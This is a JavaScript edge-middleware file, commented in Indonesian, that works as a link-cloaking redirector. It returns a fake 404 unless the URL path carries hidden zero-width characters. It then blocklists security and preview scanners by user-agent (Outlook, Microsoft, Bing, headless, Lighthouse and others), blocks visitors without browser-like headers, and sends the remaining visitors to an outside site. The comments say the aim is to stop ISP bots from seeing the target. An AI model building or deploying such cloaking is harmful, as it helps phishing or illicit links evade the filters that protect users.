export default function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  
  // 1. DETEKSI KUNCI GAIB (ZWC)
  // url.pathname akan berisi karakter yang sudah di-decode. 
  // Kita cek apakah ada karakter khusus (Unicode) di dalam path.
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));

  // 2. FILTER PINTU DEPAN: Jika tidak ada karakter gaib, kasih 404 (Pura-pura Mati)
  if (!hasZwc) {
    return new Response('404 Not Found', { status: 404 });
  }

  // 3. FINGERPRINTING MANUSIA (Agar bot ISP tidak tembus)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const hasAccept = req.headers.get('accept')?.includes('text/html');
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua) && !/bot|crawler|spider/.test(ua);

  // 4. DAFTAR HITAM BOT SCANNER
  const hardBotKeywords = [
    'bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft',
    'linkdetect', 'bing', 'preview', 'headless', 'googleusercontent',
    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud'
  ];
  const isHardBot = hardBotKeywords.some(keyword => ua.includes(keyword));

  // 5. LOGIKA EKSEKUSI
  // Jika dia bot, atau fingerprint tidak cocok (bukan mobile/desktop)
  if (isHardBot || ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
    console.log(`BLOCKED BOT: IP=${req.ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 6. REDIRECT TARGET (Hanya untuk yang bawa Kunci Gaib & Lolos Fingerprint)
  const targetUrl = 'https://nusaindahrp.com/?dev';
  
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: {
        'Content-Type': 'text/html',
        'Refresh': `0; url=${targetUrl}`
      }
    }
  );
}
